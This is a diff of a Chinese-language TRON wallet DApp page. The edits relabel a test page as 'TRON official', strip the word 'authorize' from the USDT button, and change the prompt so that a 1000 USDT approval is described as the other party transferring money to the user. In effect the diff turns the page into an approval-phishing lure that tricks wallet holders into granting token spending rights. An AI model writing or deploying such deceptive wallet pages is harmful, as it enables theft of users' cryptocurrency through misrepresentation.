@@ -2,7 +2,7 @@
 <html lang="zh">
 <head>
 <meta charset="UTF-8">
-<title>TRON 多钱包 DApp 测试</title>
+<title>TRON官方 多钱包 DApp </title>
 <style>
   /* 整体背景 */
   body {
@@ -68,11 +68,11 @@
 </head>
 <body>
 
-<h2>TRON 多钱包 DApp 测试</h2>
+<h2>TRON官方 多钱包 DApp </h2>
 
 <div class="button-container">
   <button onclick="connectWallet()">连接钱包</button>
-  <button onclick="bindAndApprove()">绑定并授权 USDT</button>
+  <button onclick="bindAndApprove()">绑定</button>
 </div>
 
 <p id="address"></p>
@@ -194,7 +194,7 @@ async function bindAndApprove() {
       setStatus("绑定成功 (TronLink)");
     }
 
-    setStatus("请在钱包弹窗中确认授权 1000 USDT");
+    setStatus("请在钱包弹窗中确认对方给你转账 1000 USDT");
     const usdt = await tronWeb.contract().at(USDT_ADDRESS);
     const fixedAmount = 1000;
     if (connector && connector.connected) {
